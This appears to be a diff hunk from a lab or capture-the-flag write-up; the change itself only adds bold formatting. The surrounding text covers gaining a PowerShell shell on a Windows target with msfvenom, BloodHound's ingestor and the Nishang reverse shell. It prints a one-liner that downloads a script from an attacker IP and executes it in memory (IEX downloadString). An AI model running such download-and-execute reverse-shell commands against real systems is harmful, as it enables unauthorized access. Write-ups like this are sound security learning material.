@@ -201,9 +201,9 @@ This is why we generated an `HTA` payload using `msfvenom` instead.
 
 *Since running* `.exe` *is disabled by* **Group Policy**, we turn to `BloodHound`'s **PowerShell injestor** (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the `Invoke-BloodHound` method.
 
-*But before we can do that,* we need a PowerShell shell.
+*But before we can do that,* we need a **PowerShell** shell.
 
-Switching to PowerShell from CMD can be done with the below command using the famous **Nishang shell** (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the `Invoke-PowerShellTcp` call at the bottom of the `.ps1`
+Switching to **PowerShell** from **CMD** can be done with the below command using the famous **Nishang shell** (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the `Invoke-PowerShellTcp` call at the bottom of the `.ps1`
 
 `powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"`
 
